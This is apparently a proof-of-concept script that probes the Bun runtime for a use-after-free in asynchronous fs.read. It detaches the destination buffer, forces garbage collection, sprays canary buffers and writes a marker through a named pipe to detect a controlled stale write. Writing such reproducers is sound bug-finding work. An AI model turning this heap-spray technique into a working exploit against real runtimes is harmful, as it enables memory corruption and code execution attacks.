import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 256);
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 2048);
const path = join(tmpdir(), `bun-async-read-canary-${process.pid}`);

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);

const fd = fs.openSync(path, fs.constants.O_RDWR);
const marker = Buffer.from("BUN_STALE_READ_CANARY_MARKER");
const payload = Buffer.alloc(size, 0x45);
marker.copy(payload, 0);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone(ab, { transfer: [ab] });
}

function gcNow() {
  if (typeof Bun?.gc === "function") Bun.gc(true);
}

function allocateCanaries() {
  return Array.from({ length: sprayCount }, () => {
    const view = new Uint8Array(new ArrayBuffer(size));
    view.fill(0x7a);
    return view;
  });
}

function findMarker(canaries) {
  for (let i = 0; i < canaries.length; i++) {
    const view = canaries[i];
    let ok = true;
    for (let j = 0; j < marker.length; j++) {
      if (view[j] !== marker[j]) {
        ok = false;
        break;
      }
    }
    if (ok) return i;
  }
  return -1;
}

async function runOne(i) {
  const ab = new ArrayBuffer(size);
  const view = new Uint8Array(ab);
  const done = new Promise((resolve) => {
    fs.read(fd, view, 0, view.byteLength, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  detach(ab);
  gcNow();
  const canaries = allocateCanaries();
  fs.writeSync(fd, payload, 0, payload.length);

  const result = await done;
  const index = findMarker(canaries);
  if (index !== -1) {
    console.error(`[fs.read:canary] controlled stale write observed iteration=${i} canary=${index} bytesRead=${result.bytesRead}`);
    return true;
  }
  return false;
}

try {
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i)) {
      process.exitCode = 86;
      break;
    }
    if (i % 16 === 0) console.error(`[fs.read:canary] progress=${i}`);
  }
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}

console.error("[fs.read:canary] done");
